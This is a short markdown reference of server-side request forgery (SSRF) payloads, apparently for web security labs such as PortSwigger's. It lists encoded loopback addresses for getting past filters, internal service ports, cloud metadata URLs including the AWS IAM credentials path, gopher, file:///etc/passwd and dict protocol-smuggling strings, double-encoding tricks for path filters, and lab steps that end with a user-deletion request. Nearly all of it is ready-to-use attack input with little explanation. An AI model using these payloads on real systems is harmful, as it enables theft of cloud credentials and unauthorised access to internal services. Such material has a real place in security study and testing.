# SSRF - Payload Reference

## Internal IP Bypass
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://0177.0.0.1           # Octal
http://0x7f000001           # Hex
http://2130706433           # Decimal
http://0177.0.0.1           # Octal dotted
http://127.1                # Short form
http://127.0.0.1.nip.io    # DNS wildcard
```

## Internal Service Discovery
```
http://127.0.0.1:80         # Web server
http://127.0.0.1:8080       # App server
http://127.0.0.1:3000       # Node.js
http://127.0.0.1:9200       # Elasticsearch
http://127.0.0.1:6379       # Redis
http://127.0.0.1:11211      # Memcached
http://127.0.0.1:3306       # MySQL
http://127.0.0.1:5432       # PostgreSQL
http://127.0.0.1:2375       # Docker API
http://127.0.0.1:8500       # Consul
```

## Cloud Metadata
```
http://169.254.169.254/latest/meta-data/           # AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/ # GCP
http://169.254.169.254/metadata/instance            # Azure
```

## Protocol Smuggling
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a...
file:///etc/passwd
dict://127.0.0.1:6379/info
```

## Blacklist Bypass (Verified)

### Host Bypass
```
http://127.1                    # Short form, bypasses localhost/127.0.0.1 keywords
http://0x7f000001               # Hex
http://0177.0.0.1               # Octal
http://2130706433               # Decimal
```

### Path Bypass (Double URL Encoding)
```
http://127.1/%2561dmin          # %2561 = encoded %61 = 'a', bypasses /admin keyword
http://127.1/%2564dmin          # %2564 = encoded %64 = 'd'
```

## PortSwigger Lab Approach
1. Find stock check / similar feature with URL parameter
2. Change URL to internal target: `http://192.168.0.1:8080/admin`
3. Or use `http://localhost/admin`
4. Delete user: `http://192.168.0.1:8080/admin/delete?username=carlos`
